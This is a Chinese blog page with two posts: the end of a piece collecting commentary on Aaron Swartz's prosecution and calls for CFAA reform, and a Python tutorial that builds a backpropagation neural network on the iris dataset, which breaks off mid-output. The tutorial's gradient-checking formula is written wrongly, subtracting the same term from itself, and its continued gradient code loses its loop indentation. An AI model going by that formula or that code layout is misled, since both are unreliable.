<p>2013年1月24日，纪念斯沃茨时，卡尔·马拉默德会议了它们有关PACER的工作。他指出它们将美国地区法律的上百万条记录从PACER的付费围墙后拉出，发现它们充斥着对隐私的违反。</p>
<p>“我们将结果发送给31个地区的主法官，他们删节这些记录并且对发送他们的律师大吼大叫。司法会议变更了他们的隐私条款。……对那些运行美国法院行政办公室的官僚……我们就是窃贼，所以他们呼叫FBI……FBI没有发现我们有任何不对。”</p>
<p>“司法检察官和法律部门官方过分积极的姿态，是因为他们曾经让他们尴尬过的复仇吗？还是以至少以他们的观点我们从PACER偷走了什么？JSTOR起诉的无情是当局官僚尴尬的复仇，因为让他们在纽约时报上看起来愚蠢，因为在参议院他们遇到了麻烦？”</p>
<p>前尼克松总统白宫法律顾问约翰·迪恩在justia.com写了篇题目为“以尼克松传统处理亚伦·斯沃茨问题：过分狂热和过分诉讼酿造悲剧结果”的法律文章，声称这不是些切实和公正坚持联邦法律的人，相反，他们是一群以无耻手段欺凌像亚伦·斯沃茨一样不幸的人们为乐子的独裁者。</p>
<p>乔治华盛顿大学法律教授奥林·科尔在2013年1月15日写到：这个控诉已经超过任何良心的检察官所该控诉太多。公爵大学法律教授詹姆士·博耶尔回应赫芬顿邮报：我认为科尔有关围绕慎重控诉的描述是事实，他们倾向于最小化和忽略有利斯沃茨的事实。</p>
<p>有个老记者叫Jane Scholz不认同将斯沃茨转化为面对美国政府控诉的英雄。他认为斯沃茨很熟悉信息财产保护的法律，他不应该对他自己招致的罪行有多严重吃惊。他是罪犯，不是受害者。我是个老记者，我工作时的工资来自版权，退休后的退休金来自版权。最近几年杂志社业绩不好，成千上万记者失去薪资甚至失业，我发现很讽刺的是斯沃茨还能把有版权的软件卖出去赚钱。斯沃茨事件是个悲剧，但他不是英雄。</p>
<p>法律教授麦克·麦迪逊评论道：找不到比这更巧舌如簧的话了“我的失业曾经很成功但现在不是了……”和“有些人犯罪了”由此感染了当代知识产权的议论。</p>
<p>大卫·艾伦诺维奇在时代杂志指出JSTOR本身就是慈善事业，但他不得不向学术出版商付费。他指责无法被说服的一代人认为版权还重要的“不顾一切”的行为。</p>
<p>相反，高等教育纪事报的皮特·勒德洛认为由于当前学术界发表或是灭亡的现状和杂志声誉的重要性。“当学者将将版权签给出版商之后就积累出一种一方拥有权利无法讨价还价的情况。像论文原作者一样，JSTOR也不得不在弱势上跟出版商协商许可。勒德洛展示了JSTOR和出版商的协商协议，规定出版商若销售量小于在他们旧材料最小销售时有要以补偿。而且JSTOR必须在获得JSTOR自己收益之前。”他总结道：“学术界应该团结一心，使用新的出版模式，我们必须认清亚伦·斯沃茨这样的个人不服从是合法的。”</p>
<p>Rob Weir，一个自称小杂志的助理编辑在写Inside Higher Ed道：“许多人奇怪为什么那些只聚合其他人劳动成果的人应该赚钱，特别是当很多纳税人的钱承销了许多文章。这时合法的考虑，但是斯沃茨的做法超越了法律和法理的界限。”然而他承认“JSTOR像个大爷一样向大学图书馆收费提供服务”，他认为，“即使最普通的杂志也需要高额资金生产，如果你想让任何人读你的期刊，你得给JSTOR钱或者其它聚合机构钱。除非，你能招揽一大堆广告。”他总结道：“信息想要免费”的谚语无法揭示“信息自由下隐藏的代价”，他建议“天下没有免费的午餐”还是对当前信息社会生产发展相适应的总结。他向黑客和信息窃贼告诫道：“若你无法做对的，就别犯罪”。</p>
<p>蒂姆·吴，在纽约客上写到他认为的不符的起诉。“行为本身无害，意味着没有实际的物理伤害和经济伤害。泄漏被发现和回收;JSTOR没有遭受经济损失，也没有提起诉讼。就像个恶作剧，斯沃茨的行为令受害者恼怒，但是没有持续的结果。”吴继续比较了斯沃茨的行为和乔布斯、斯蒂夫·沃兹尼亚克，“在20世纪70年代，犯下了类似罪行，但是一样没有造成经济损失。这两个人黑掉了贝尔实验室的点环系统打长途电话，还出售他们的设备赚钱。他们的老师约翰·德雷珀确实去监狱呆了一个月，但是乔布斯和沃兹尼亚克从未被起诉。相反，他们厌倦了电话黑客转而构建电脑。伟大的人总是在边缘游走。”吴写道：“我们可以根据一个社会如何对待怪人和艺术天才正确评价它，显然通过这次，我们完全失败了。”</p>
<h2 id="关于法律">关于法律</h2><p>这之后科尔在哈芬顿邮报专栏呼吁对控告斯沃茨的计算机欺诈和滥用法案改革。“斯沃茨案件的问题在于，重罪责任太容易被触发了。法律需要明确分清什么是轻罪什么是重罪，当前法律做的很差。”</p>
<p>来自美国民主自由联盟的科技政策分析师克里斯同样认为：“现存法律无法区分两类罪行的区别：为了获取利益的恶意犯罪和黑客攻入系统证明他们的技艺或者向公众散步他们认为应该公开的信息的行为。”斯坦福网络和社会中心人民自由执行官，也是斯沃茨的辩护律师珍妮佛质疑了控告斯沃茨的法律(CFAA)的适用范围。</p>
<p>法律教授斯蒂芬·卡特同意对斯沃茨的控告非常荒唐，也提出了对国会没几周就粗略炮制新类型联邦重罪的行为进行了批评。卡特认为CFAA是这个现象的一个佳例。他写道：“在20世纪80年代制定，在互联网大爆炸之前。法规让任何意图未经或超越授权接入计算机的人，在这个过程中，获取金融信息、政府信息或者任何从受保护的计算机上获取的信息，都成为罪犯。”卡特举个例子，就像你在上班，忽然想起来有个账单没付，于是登录银行支付。如果公司禁止雇员使用电脑干私人的事，你就越权了，你又登录银行获取了金融信息。相信与否，你是重罪。诉讼的可能性很小，但你还是犯罪了。卡特接着写到法律的问题是知名的，联邦法院已经给出了狭隘的司法解释。但有些人还是泛泛地理解它，并且奥巴马政府反对国会缩小其领域范围的努力。上诉法院第九轮主审亚历克斯·科金斯基警告2012年春政府的立场会让大量民众会因为微不足道的原因被怀疑犯下联邦罪名的人成为罪犯。</p>
<p>2013年，佐伊洛夫格伦和罗恩维登(两人分别是民主党前国会议员和参议员)提出一个法律建议叫做“亚伦法”，为了修订CFAA来消除之前提到的模糊性和消除是一个人对同意罪行遭受多次惩罚的冗余规定。正如连线杂志提到的，“这事实正是亚伦·斯沃茨所蒙受的，取代的起诉书超过三分之一的指控都是CFAA规定冗余带来的。”</p>
<h3 id="反应、申诉和撤诉行动">反应、申诉和撤诉行动</h3><p>在儿子的葬礼上，罗伯特·斯沃茨说：“亚伦是被政府杀害的，MIT违背了它的基本原则。”莲花公司创始人将其发布在推特上。对此，检察官卡门·奥蒂斯的丈夫，IBM执行官汤姆·多论回应说，“真他妈难以置信他自己儿子的讣告上责备他人的责任而不提我们提供了6个月监禁的选择。”马上在杂志Esquire上，查理·皮尔斯(作家)就写道，“检察官和她丈夫的狡辩仅仅在低警戒或者没有警戒的监狱，联邦监狱受折磨六个月，是我们的检察官那些日子里行事不够正常的进一步迹象。”</p>
<p>卫报联系奥蒂斯的发言人，发言人称对此事不置评论。路透社报导无法联系上其丈夫多伦。在2013年1月16日，奥蒂斯发布了官方声明，她重申了“我必须阐明官方在引入和处理此案的行为是合理的。”并且她的下属在“坚守誓言执行法律时肩负着困难的任务，但他们做了合理的事。”</p>
<p>2013年1月28日，斯沃茨的房产律师想司法部控诉助理检察官斯蒂芬·海曼职业行为不当。他们说海曼“向法庭有关联邦政府摄入调查的程度和范围进行了不实汇报。”</p>
<p>“邮件和报导更一步显示……海曼自身涉入了调查，甚至在斯沃茨一月6号被捕之前。”</p>
<p>律师们认为海曼当他强迫斯沃茨认罪时滥用了他的酌处权：</p>
<p>“斯沃茨……自然感觉放弃他的权利备受压力……四个月和相差七年的差距太大……对被告的量刑应该遵循量刑指南中承担责任条款要求”(认罪减免两到三级罪行。)</p>
<p>3月15日，律师要求联邦法院更改斯沃茨文件的保护令允许公开披露发现的材料，包括MIT，JSTOR中人员和法律部门雇员的姓名和头衔。律师们声称保留姓名让文档不易被国会更好理解和使用。马州首席助理检察官表示他在积极残余讨论，并将询问法庭给受影响雇员一个对建议的披露被聆听机会。</p>
<p>司法部寻求编撰涉案检察官的姓名。在2013年4月3日，美国联邦检察官办公室发言人说，“我们反对公开的原因在于，涉案人员不仅会受到影响，有时还受到残余影响”。联邦检察官办公室报告了数起针对已知涉案检察官的威胁和骇客尝试：“奥蒂斯和海曼受到威胁邮件，对海曼facebook帐号的骇客，海曼哈佛大学教授的父亲收到其在断头台的照片。”明信片和一些邮件摘录被连线杂志发布。</p>
<p>2013年5月13日，法院准予了房产律师们的部分行动，允许公开披露大量资产律师寻求解封的材料。但政府和MIT雇员的名字被替换。资产律师们认为姓名的披露胜过政府的利益和保护受害者远离潜在报复的可能。检察官和斯沃茨律师被勒令在2013年5月27日前协商披露和删节的条款。</p>
<p>凯文·鲍尔森(前黑客)于2013年11月提交了一个信息自由法案(FOIA)诉讼获取了130页来自美国特勤局有关斯沃茨的文件，美国特勤局有近20000页有关斯沃茨的文件。</p>
<p>关于海曼，BuzzFeed(一个社会新闻和娱乐网站)强调：“2008年，年轻黑客乔纳森·詹姆士在同一个检察官主导的联邦调查中自杀。”</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/machine-learning/2014/06/02//" itemprop="url">
                  实现一个反向传播人工神经网络
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-06-02T00:00:00+08:00" content="2014-06-02">
              2014-06-02
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/machine-learning/" itemprop="url" rel="index">
                    <span itemprop="name">machine learning</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/machine-learning/2014/06/02//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="machine-learning/2014/06/02//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h1 id="为何实现一个BP神经网络？">为何实现一个BP神经网络？</h1><blockquote>
<p>“What I cannot create, I do not understand”</p>
<p>— Richard Feynman,  February 1988</p>
</blockquote>
<hr>
<h2 id="实现一个BP神经网络的7个步骤">实现一个BP神经网络的7个步骤</h2><ol>
<li>选择神经网络 <em>结构</em></li>
<li><em>随机</em> 初始化权重</li>
<li>实现 <em>前向传播</em> </li>
<li>实现 <em>成本函数</em> $J(\Theta)$</li>
<li>实现反向传播算法并计算 <em>偏微分</em> $\frac{\partial}{\partial<br>\Theta_{jk}^{(i)}}J(\Theta)$</li>
<li>使用 <em>梯度检查</em> 并在检查后关闭</li>
<li>使用梯度下降或其它优化算法和反向传播来 <em>优化</em> $\Theta$ 的函数 $J(\Theta)$</li>
</ol>
<hr>
<h2 id="数据集">数据集</h2><p>我们选取著名的鸢尾花数据集作为神经网络作用的对象，首先先观察下数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">2</span>]:</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line"><span class="comment"># random it</span></span><br><span class="line">perm = np.random.permutation(iris.target.size)</span><br><span class="line">iris.data = iris.data[perm]</span><br><span class="line">iris.target = iris.target[perm]</span><br><span class="line"><span class="keyword">print</span> iris.data.shape</span><br><span class="line"><span class="keyword">print</span> iris.target.shape </span><br><span class="line">np.unique(iris.target)</span><br><span class="line"><span class="comment">#print iris</span></span><br><span class="line">Out[<span class="number">2</span>]:</span><br><span class="line">    (<span class="number">150</span>, <span class="number">4</span>)</span><br><span class="line">    (<span class="number">150</span>,)</span><br><span class="line"></span><br><span class="line">    array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>可见，鸢尾花数据集有四个特征，分为三种类别，总共150个条数据。</p>
<hr>
<h1 id="选择人工神经网络结构">选择人工神经网络结构</h1><p><img src="/images/nn.png" alt="神经网络架构图"></p>
<hr>
<h1 id="随机初始化权重">随机初始化权重</h1><h2 id="网络权重随机初始化">网络权重随机初始化</h2><p> 初始化 $\Theta_{ij}^{(l)}$ 为  $[-\epsilon, \epsilon]$ 之间的随机值。</p>
<p> 初始化函数可定义如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">3</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_init</span><span class="params">(input_layer_size, hidden_layer_size, classes, init_epsilon=<span class="number">0.12</span>)</span>:</span></span><br><span class="line">    Theta_1 = np.random.rand(hidden_layer_size, input_layer_size + <span class="number">1</span>) * <span class="number">2</span> * init_epsilon -init_epsilon</span><br><span class="line">    Theta_2 = np.random.rand(classes, hidden_layer_size + <span class="number">1</span>) * <span class="number">2</span> * init_epsilon -init_epsilon</span><br><span class="line">    <span class="keyword">return</span> (Theta_1, Theta_2)</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="实现前向传播">实现前向传播</h1><p>每一层都以此为公式计算下一层：</p>
<p>$$<br>G_{\theta^{(l)}(X)} = \frac{1}{1 + e^{-X(\Theta^{(l)})^T}}<br>$$</p>
<p>注意添加偏差项。</p>
<hr>
<h3 id="前向传播函数定义如下">前向传播函数定义如下</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">4</span>]:</span><br><span class="line"><span class="comment"># 先定义一个sigmoid函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(theta, X)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (<span class="number">1</span> + np.e ** (-np.dot(X, np.transpose(theta))))</span><br><span class="line"><span class="comment"># 前向传播函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(Theta_1, Theta_2, X)</span>:</span></span><br><span class="line">    h = g(Theta_1, np.hstack((np.ones((X.shape[<span class="number">0</span>], <span class="number">1</span>)), X)))</span><br><span class="line">    o = g(Theta_2, np.hstack((np.ones((h.shape[<span class="number">0</span>], <span class="number">1</span>)), h)))</span><br><span class="line">    <span class="keyword">return</span> o</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="实现成本函数">实现成本函数</h1><h2 id="成本函数的数学表示">成本函数的数学表示</h2><p>$$<br>J(\Theta) = -\frac{1}{m}[\sum<em>{i=1}^m<br>\sum</em>{k=1}^Ky<em>k^{(i)}\log(h</em>\Theta(x^{(i)}))_k + (1 -<br>y<em>k^{(i)})\log(1-h</em>\Theta(x^{(i)}))<em>k)] + \frac{\lambda}{2m}\sum</em>{l=1}^{L-1}\sum<br>_{i=1}^{s<em>l}\sum</em>{j=1}^{s<em>{l+1}}(\Theta</em>{ji}^{(l)})^2<br>$$</p>
<p>$K$是输出层单元个数, $L$是层数，我们这里是三， $s_l$ 是层 $l$ 中单元数。</p>
<hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">5</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">costfunction</span><span class="params">(nn_param, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1 = nn_param[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, (input_layer_size + <span class="number">1</span>)))</span><br><span class="line">    Theta_2 = nn_param[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, (hidden_layer_size + <span class="number">1</span>)))</span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># recode y</span></span><br><span class="line">    y_recoded = np.eye(classes)[y,:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print y_recoded</span></span><br><span class="line">    <span class="comment"># calculate regularator</span></span><br><span class="line">    regularator = (np.sum(Theta_1**<span class="number">2</span>) + np.sum(Theta_2 ** <span class="number">2</span>)) * (lamb_da/(<span class="number">2</span>*m))</span><br><span class="line"></span><br><span class="line">    a3 = predict(Theta_1, Theta_2, X)</span><br><span class="line"></span><br><span class="line">    J = <span class="number">1.0</span> / m * np.sum(-<span class="number">1</span> * y_recoded * np.log(a3)-(<span class="number">1</span>-y_recoded) * np.log(<span class="number">1</span>-a3)) + regularator</span><br><span class="line">    <span class="comment"># print J</span></span><br><span class="line">    <span class="keyword">return</span> J</span><br></pre></td></tr></table></figure>
<p>因为scipy中优化函数要求输入参数是向量而不是矩阵，因此我们的函数实现也必须能够随时展开和复原矩阵。</p>
<hr>
<h1 id="实现反向传播">实现反向传播</h1><ul>
<li>正向传播计算网络输出</li>
<li>反向计算每一层的误差$\sigma^{(l)}$</li>
<li>由误差累加计算得到成本函数的偏微分$\frac{\partial}{\partial\Theta_{ij}^{(l)}}J(\Theta)$</li>
</ul>
<p>同样，在实现函数时因为要传递给<code>scipy.optimize</code>模块中的优化函数，必须能展开矩阵参数为向量并可随时复原。</p>
<p>详细实现过程参见Andrew NG在Coursera上的讲座。</p>
<p>数学推导过程请 <em>自行</em> 上coursera ml课程论坛搜索。</p>
<hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">6</span>]:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gradient</span><span class="params">(nn_param, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    </span><br><span class="line">    Theta_1 = nn_param[:hidden_layer_size * (input_layer_size + <span class="number">1</span>)].reshape((hidden_layer_size, (input_layer_size + <span class="number">1</span>)))</span><br><span class="line">    Theta_2 = nn_param[hidden_layer_size * (input_layer_size + <span class="number">1</span>):].reshape((classes, (hidden_layer_size + <span class="number">1</span>)))</span><br><span class="line">    </span><br><span class="line">    m = X.shape[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    Theta1_grad = np.zeros(Theta_1.shape);</span><br><span class="line">    Theta2_grad = np.zeros(Theta_2.shape);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="comment"># For the input layer, where l=1:</span></span><br><span class="line">        <span class="comment"># add a bias unit and forward propagate</span></span><br><span class="line">        a1 = np.hstack((np.ones((X[t:t+<span class="number">1</span>,:].shape[<span class="number">0</span>], <span class="number">1</span>)), X[t:t+<span class="number">1</span>,:]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># For the hidden layers, where l=2:</span></span><br><span class="line">        a2 = g(Theta_1, a1)</span><br><span class="line">        a2 = np.hstack((np.ones((a2.shape[<span class="number">0</span>], <span class="number">1</span>)), a2))</span><br><span class="line">        a3 = g(Theta_2, a2)</span><br><span class="line"></span><br><span class="line">        yy = np.zeros((<span class="number">1</span>, classes))</span><br><span class="line">        yy[<span class="number">0</span>][y[t]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># For the delta values:</span></span><br><span class="line">        delta_3 = a3 - yy;</span><br></pre></td></tr></table></figure>
<hr>
<p>续上页</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    delta_2 = delta_3.dot(Theta_2) * (a2 * (<span class="number">1</span> - a2))</span><br><span class="line">    delta_2 = delta_2[<span class="number">0</span>][<span class="number">1</span>:] <span class="comment"># Taking of the bias row</span></span><br><span class="line">    delta_2 = np.transpose(delta_2)</span><br><span class="line">    delta_2 = delta_2.reshape(<span class="number">1</span>, (np.size(delta_2)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># delta_1 is not calculated because we do not associate error with the input</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Big delta update</span></span><br><span class="line">    Theta1_grad = Theta1_grad + np.transpose(delta_2).dot(a1);</span><br><span class="line">    Theta2_grad = Theta2_grad + np.transpose(delta_3).dot(a2);</span><br><span class="line"></span><br><span class="line">Theta1_grad = <span class="number">1.0</span> / m * Theta1_grad + lamb_da / m * np.hstack((np.zeros((Theta_1.shape[<span class="number">0</span>], <span class="number">1</span>)), Theta_1[:, <span class="number">1</span>:]))</span><br><span class="line">Theta2_grad = <span class="number">1.0</span> / m * Theta2_grad + lamb_da / m * np.hstack((np.zeros((Theta_2.shape[<span class="number">0</span>], <span class="number">1</span>)), Theta_2[:, <span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">Grad = np.concatenate((Theta1_grad.ravel(), Theta2_grad.ravel()), axis=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> Grad</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="梯度检测">梯度检测</h1><blockquote>
<p>“But back prop as an algorithm has a lot of details and,you know, can be a<br>little bit tricky to implement.”</p>
<p>– Andrew NG如是说</p>
</blockquote>
<ul>
<li>即使看上去成本函数在一直减小，可能神经网络还是有问题。</li>
<li>梯度检测能让你确认，哦，我的实现还正常。</li>
</ul>
<hr>
<h2 id="梯度检测原理">梯度检测原理</h2><p>简单的微分近似。但相比反向传播神经网络算法计算量更大。</p>
<p>$$<br>\frac{\partial}{\partial\theta<em>{i}}J(\theta) \approx<br>\frac{J(\theta</em>{i}+\epsilon) - J(\theta_{i}+\epsilon) }{2\epsilon}<br>$$</p>
<h3 id="这种梯度计算实现如下：">这种梯度计算实现如下：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">7</span>]:</span><br><span class="line"><span class="comment"># define compute_grad</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_grad</span><span class="params">(theta, input_layer_size, hidden_layer_size, classes, X, y, lamb_da, epsilon=<span class="number">1e-4</span>)</span>:</span></span><br><span class="line">    n = np.size(theta)</span><br><span class="line">    gradaproxy = np.zeros(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        theta_plus = np.copy(theta) <span class="comment"># Important for in numpy assign is shalow copy</span></span><br><span class="line">        theta_plus[i] = theta_plus[i] + epsilon</span><br><span class="line">        theta_minus = np.copy(theta)</span><br><span class="line">        theta_minus[i] = theta_minus[i] - epsilon</span><br><span class="line">        gradaproxy[i] = (costfunction(theta_plus, input_layer_size, hidden_layer_size, classes, X, y, lamb_da) - costfunction(theta_minus, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)) / (<span class="number">2.0</span> * epsilon)</span><br><span class="line">    <span class="keyword">return</span> gradaproxy</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="把一切放到一起">把一切放到一起</h1><p>先定义训练函数如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">8</span>]:</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> optimize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span>:</span></span><br><span class="line">    Theta_1, Theta_2 = random_init(input_layer_size, hidden_layer_size, classes, init_epsilon=<span class="number">0.12</span>)</span><br><span class="line">    nn_param = np.concatenate((Theta_1.ravel(), Theta_2.ravel()))</span><br><span class="line">    final_nn = optimize.fmin_cg(costfunction, </span><br><span class="line">                                np.concatenate((Theta_1.ravel(), Theta_2.ravel()), axis=<span class="number">0</span>), </span><br><span class="line">                                fprime=Gradient, </span><br><span class="line">                                args=(input_layer_size,</span><br><span class="line">                                      hidden_layer_size, </span><br><span class="line">                                      classes, </span><br><span class="line">                                      X, </span><br><span class="line">                                      y,</span><br><span class="line">                                      lamb_da))</span><br><span class="line">    <span class="keyword">return</span> final_nn</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="使用训练集进行训练">使用训练集进行训练</h2><p>我选取鸢尾花数据集的100条作为训练集，剩下50条作为测试集。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">9</span>]:</span><br><span class="line">X = iris.data[:<span class="number">100</span>]</span><br><span class="line">y = iris.target[:<span class="number">100</span>]</span><br><span class="line">lamb_da = <span class="number">1.0</span> <span class="comment"># must be float</span></span><br><span class="line">input_layer_size = <span class="number">4</span></span><br><span class="line">hidden_layer_size = <span class="number">6</span></span><br><span class="line">classes = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">final_nn = train(input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"></span><br><span class="line">    Warning: Desired error <span class="keyword">not</span> necessarily achieved due to precision loss.</span><br><span class="line">             Current function value: <span class="number">0.878999</span></span><br><span class="line">             Iterations: <span class="number">48</span></span><br><span class="line">             Function evaluations: <span class="number">152</span></span><br><span class="line">             Gradient evaluations: <span class="number">140</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="检测两种方式计算的梯度是否近似">检测两种方式计算的梯度是否近似</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In[<span class="number">10</span>]:</span><br><span class="line"><span class="comment"># gradient checking</span></span><br><span class="line">grad_aprox = compute_grad(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line">grad_bp = Gradient(final_nn, input_layer_size, hidden_layer_size, classes, X, y, lamb_da)</span><br><span class="line"><span class="keyword">print</span> (grad_aprox - grad_bp) &lt; <span class="number">1e-1</span></span><br><span class="line"></span><br><span class="line">    [ <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span>  <span class="keyword">True</span></span><br><span class="line">      <span 